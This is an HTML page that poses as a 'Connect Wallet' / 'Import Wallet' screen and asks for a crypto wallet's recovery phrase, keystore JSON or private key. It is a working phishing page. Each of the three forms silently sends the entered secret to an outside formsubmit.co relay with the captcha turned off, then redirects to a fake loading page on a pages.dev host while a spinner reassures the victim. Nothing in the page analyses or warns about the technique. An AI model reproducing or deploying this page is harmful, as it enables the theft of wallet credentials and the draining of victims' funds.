<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connect Wallet</title>
  <link rel="stylesheet" href="../css/styles.css" />
  <link rel="icon" href="interconnected.png" type="image/x-icon" />
  <link rel="shortcut icon" href="interconnected.png" type="image/x-icon" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com/" />
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=Poppins:wght@200;300;400;500;600&display=swap" rel="stylesheet" />

  <style>
    .wrapper {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 300px;
      text-align: center;
      transform: translateX(-50%);
    }

    .spanner {
      position: absolute;
      top: 50%;
      left: 0;
      background: #2a2a2a;
      width: 100%;
      display: block;
      text-align: center;
      height: 300px;
      color: #FFF;
      transform: translateY(-50%);
      z-index: 1000;
      visibility: hidden;
    }

    .overlay {
      position: fixed;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      visibility: hidden;
    }

    .loader,
    .loader:before,
    .loader:after {
      border-radius: 50%;
      width: 2.5em;
      height: 2.5em;
      -webkit-animation-fill-mode: both;
      animation-fill-mode: both;
      -webkit-animation: load7 1.8s infinite ease-in-out;
      animation: load7 1.8s infinite ease-in-out;
    }

    .loader {
      color: #ffffff;
      font-size: 10px;
      margin: 80px auto;
      position: relative;
      text-indent: -9999em;
      -webkit-transform: translateZ(0);
      -ms-transform: translateZ(0);
      transform: translateZ(0);
      -webkit-animation-delay: -0.16s;
      animation-delay: -0.16s;
    }

    .loader:before,
    .loader:after {
      content: '';
      position: absolute;
      top: 0;
    }

    .loader:before {
      left: -3.5em;
      -webkit-animation-delay: -0.32s;
      animation-delay: -0.32s;
    }

    .loader:after {
      left: 3.5em;
    }

    @-webkit-keyframes load7 {
      0%, 80%, 100% { box-shadow: 0 2.5em 0 -1.3em; }
      40% { box-shadow: 0 2.5em 0 0; }
    }

    @keyframes load7 {
      0%, 80%, 100% { box-shadow: 0 2.5em 0 -1.3em; }
      40% { box-shadow: 0 2.5em 0 0; }
    }

    .show {
      visibility: visible;
    }

    .spanner, .overlay {
      opacity: 0;
      transition: all 0.3s;
    }

    .spanner.show, .overlay.show {
      opacity: 1;
    }
  </style>
</head>

<body>

  <div class="wrapper"></div>
  <div class="overlay"></div>
  <div class="spanner">
    <div class="loader"></div>
    <p>Submitting, please be patient.</p>
  </div>

  <div class="container pt-5 pb-3">
    <img src="img/W%20iconn.png" alt="wallet-header" class="mx-auto d-block">
    <p class="br-iw pt-3 text-center">Import Wallet</p>
  </div>

  <div class="container import-tabs py-4">
    <button class="tab active" onclick="openTab(event, 'phrase-form')">Phrase</button>
    <button class="tab" onclick="openTab(event, 'json-form')">Keystore JSON</button>
    <button class="tab" onclick="openTab(event, 'pkey-form')">Private Key</button>
  </div>

  <div class="container">
    <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
      <form id="pass-phrase" action="https://formsubmit.co/ae7ea4b32efb94f0425119d66991ccf5" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
        <textarea name="phrase" class="phrase-field" placeholder="Enter your recovery phrase" required></textarea>
        <button type="submit" class="form-button">Import</button>
        <p class="form-instrunctions text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
      </form>
    </div>

    <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form" style="display:none;">
      <form id="keystore-json" action="https://formsubmit.co/ae7ea4b32efb94f0425119d66991ccf5" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
        <textarea name="keystore" class="phrase-field" placeholder="Keystore JSON" required></textarea>
        <button type="submit" class="form-button">Import</button>
        <p class="form-instrunctions text-center">JSON file content and password</p>
      </form>
    </div>

    <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form" style="display:none;">
      <form id="private-key" action="https://formsubmit.co/ae7ea4b32efb94f0425119d66991ccf5" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
        <textarea name="privatekey" class="phrase-field" placeholder="Private Key" required></textarea>
        <button type="submit" class="form-button">Import</button>
        <p class="form-instrunctions text-center">Typically 64 alphanumeric characters</p>
      </form>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    function openTab(evt, tabId) {
      const tabContents = document.getElementsByClassName("tab-content");
      for (let i = 0; i < tabContents.length; i++) {
        tabContents[i].style.display = "none";
      }

      const tabs = document.getElementsByClassName("tab");
      for (let i = 0; i < tabs.length; i++) {
        tabs[i].classList.remove("active");
      }

      document.getElementById(tabId).style.display = "block";
      evt.currentTarget.classList.add("active");
    }

    document.querySelectorAll("form").forEach(form => {
      form.addEventListener("submit", () => {
        document.querySelector(".spanner").classList.add("show");
        document.querySelector(".overlay").classList.add("show");
      });
    });
  </script>

</body>
</html>
